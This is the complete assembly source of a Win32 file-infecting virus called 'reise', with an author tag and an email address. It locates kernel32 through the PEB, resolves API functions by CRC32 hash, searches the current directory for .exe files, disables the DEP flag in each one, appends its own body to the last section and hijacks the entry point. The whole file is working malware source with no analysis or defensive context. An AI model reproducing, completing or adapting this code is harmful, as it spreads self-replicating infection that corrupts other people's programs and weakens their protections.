.486
.model  flat, stdcall
.code   windy
include reise.inc
reise_exe       proc
        push    eax
        pushad
        push    30h                             ;PEB
        pop     esi
        mov     eax, dword ptr fs:[esi]
        mov     eax, dword ptr [eax + 8]
        add     eax, rExitProcess               ;replaced by entrypoint
        mov     dword ptr [esp + stackpadstruct.pusheax + sizeof stackpadstruct.pushesi], eax
        xor     edx, edx
        call    a1
        pop     eax
        pop     eax
        pop     esp
        xor     eax, eax
        pop     dword ptr fs:[eax]
        pop     eax
        popad
        ret
        setse   edx, a1
        call    $ + 5                           ;this near + 5
        stc
        sbb     dword ptr [esp], esi
        lods    dword ptr fs:[esi]
        mov     eax, dword ptr [eax + Ldr + PEB shr 10h]
        mov     esi, dword ptr [eax + Ldr + InInitializationOrderModuleList_Flink + PEB shr 10h]
        lodsd
        mov     ebp, dword ptr [eax + 8]
        call    skip_crcdws
        crc32v

skip_crcdws:
        pop     esi

;---------------------------------------------------------------------
;walk lists
;---------------------------------------------------------------------

import_next:
        mov     eax, dword ptr [ebp + IMAGE_DIRECTORY_ENTRY_EXPORT - IMAGE_NT_HEADERS.OptionalHeader.FileAlignment]
        mov     ebx, dword ptr [ebp + eax + IMAGE_DOS_HEADER.e_lfanew shl 1]
        add     ebx, ebp

export_next:
        mov     edi, dword ptr [ebx + IMAGE_EXPORT_DIRECTORY.AddressOfNames]
        add     edi, ebp
        mov     edi, dword ptr [edi + edx * 4]
        add     edi, ebp
        xor     eax, eax
        dec     eax
        crc32d  eax, edi, al
        not     eax
        cmp     dword ptr [esi], eax
        je      resolve
        inc     edx
        cmp     dword ptr [ebx + IMAGE_EXPORT_DIRECTORY.TimeDateStamp + IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint - IMAGE_EXPORT_DIRECTORY.TimeDateStamp shl 2 - sizeof IMAGE_EXPORT_DIRECTORY.NumberOfNames], edx
        jne     export_next
        int     3                               ;end up crashing

;---------------------------------------------------------------------
;resolve API address
;----
;find exe files
;---------------------------------------------------------------------

resolve:
        mov     edi, dword ptr [ebx + IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals]
        add     edi, ebp
        movzx   edi, word ptr [edi + edx * 2]
        mov     eax, dword ptr [ebx + IMAGE_EXPORT_DIRECTORY.AddressOfFunctions]
        add     eax, ebp
        mov     eax, dword ptr [eax + edi * 4]
        add     eax, ebp
        push    eax
        lodsd
        cdq                                     ;if no fxxxxxxxh
        cmp     byte ptr [esi], dl              ;db
        jne     import_next
        xor     ebx, ebx
        push    esp
        mov     dh, 2
        pop     ebp                             ;base-pointer
        sub     esp, edx
        mov     edi, esp
        push    "e"
        push    "xe.*"                          ;executable file
        push    esp
        pop     ecx
        push    edi
        push    ecx
        call    esFindFirstFileA
        xchg    esi, eax
        
labelg  open_file
        push    ebx
        push    ebx
        push    3
        push    ebx
        push    3
        push    3
        lea     ecx, dword ptr [edi + 2ch]
        push    ecx
        call    esCreateFileA
        push    eax
        push    ebx
        push    ebx 
        push    ebx
        push    4
        push    ebx
        push    eax
        call    esCreateFileMappingA
        push    eax
        push    ebx
        push    ebx
        push    ebx
        push    2
        push    eax
        call    esMapViewOfFile
        push    eax
        pushad
        call    infect_exe
        pop     eax
        pop     eax
        pop     esp
        jmp     skip_file

;---------------------------------------------------------------------
;MZ and PE signatures
;---------------------------------------------------------------------

infect_exe      proc
        push    dword ptr fs:[ebx]
        mov     dword ptr fs:[ebx], esp
        mov     esi, dword ptr [ebp + rvansin - stackpadstruct.pushebp - 8]
        mov     ebp, eax
        cmp     word ptr [eax], 'ZM'
        jne     skip_file
        add     eax, dword ptr [ebp + IMAGE_DOS_HEADER.e_lfanew]
        cmp     dword ptr [eax], 'EP'
        je      guicui_app

labelg  skip_file
        xor     eax, eax
        pop     dword ptr fs:[eax]
        pop     eax
        popad
        call    esUnmapViewOfFile
        call    esCloseHandle
        call    esCloseHandle
        push    edi
        push    esi
        call    esFindNextFileA
        test    eax, eax
        jnz     open_file
        int     3                               ;end up crashing
                                                ;all her doubts were someone else's point of view
;---------------------------------------------------------------------
;32-bit machine. GUI or CUI mode
;----
;infect file
;---------------------------------------------------------------------

guicui_app:
        inc     bh
        test    word ptr [eax + sizeof machine], bx
        jz      skip_file
        mov     dl, byte ptr [eax + IMAGE_NT_HEADERS.OptionalHeader.Subsystem]
        sub     dl, 2
        cmp     dl, bh
        jnbe    skip_file     
        lea     edx, dword ptr [eax + IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics]
        test    word ptr [edx], bx
        jz      skip_dep
        sub     word ptr [edx], bx

skip_dep:
        mov     bh, 10h
        add     edx, offset reise_end - offset reise_off

;---------------------------------------------------------------------
;it should fit
;---------------------------------------------------------------------

        movzx   ecx, word ptr [eax + IMAGE_NT_HEADERS.FileHeader.NumberOfSections]
        imul    ecx, ecx, 28h
        lea     edi, dword ptr [edx + ecx + (IMAGE_NT_HEADERS.OptionalHeader.SizeOfStackReserve - (sizeof IMAGE_SECTION_HEADER - IMAGE_SECTION_HEADER.SizeOfRawData))]
        mov     ecx, dword ptr [edi]
        add     ecx, dword ptr [edi + 4]
        cmp     dword ptr [edx + 4], ebx
        jb      skip_file
        cmp     dword ptr [edx], ecx
        jne     skip_file
        fldz
        fstp    qword ptr [edx]
        fldz
        fstp    qword ptr [edx + IMAGE_NT_HEADERS.OptionalHeader.BaseOfData]
        mov     edx, dword ptr [edi - 4]
        add     edx, dword ptr [edi]
        add     dword ptr [edi], ebx
        add     dword ptr [eax + IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage], ebx
        add     dword ptr [edi - IMAGE_SECTION_HEADER.Misc.VirtualSize], ebx
        push    ebx
        lea     edi, dword ptr [ebp + ecx]
        pop     ecx
        push    edi
        pop     ebp
        rep     movsb
        xchg    dword ptr [eax + IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint], edx
        mov     dword ptr [ebp + 0ch], edx
        int     3                               ;end up crashing
infect_exe      endp

;---------------------------------------------------------------------
;no padding purpose
;---------------------------------------------------------------------

labelg  reise_tail                              ;a beautiful long tail
        db      0fb0h - (offset reise_tail - reise_exe) dup ("h")
machine db      16h dup ("h")

labelg  reise_off
        db      3ah dup ("h")

labelg  reise_end
labelg  messagebody
        db      "reise by halloweeney"          ;glosoli
        dd      0                               ;the great gig in the sky
        org     $ - 3
reise_exe       endp

message         proc
        xor     ebx, ebx
        push    ebx
        push    ebx
        push    offset messagebody
        push    ebx
        call    MessageBox
        push    ebx 
        call    ExitProcess
message         endp    	
.const
rExitProcess    equ    offset message - 400000h ;host entrypoint
end     reise_exe
hh86_@live.com :)